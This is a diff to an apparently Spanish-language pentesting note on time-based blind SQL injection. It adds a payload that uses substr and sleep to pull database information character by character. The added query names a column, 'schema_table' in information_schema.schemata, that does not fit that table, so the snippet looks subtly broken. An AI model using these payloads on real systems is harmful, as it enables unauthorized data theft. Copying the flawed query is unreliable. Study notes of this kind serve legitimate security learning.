@@ -132,7 +132,9 @@ admin' and if(substr((select group_concat(schema_name) from information_schema.s
 
 Entonces si ya tienes la BD, por ej `vip`
 
-
+```sql
+admin' and if(substr((select group_concat(schema_table) from information_schema.schemata),{pos},1)='{caracter}',sleep(0.9),1)-- -
+```
 ### Identificar la Base de Datos Actual
 
 Dependiendo del motor, el comando cambia:
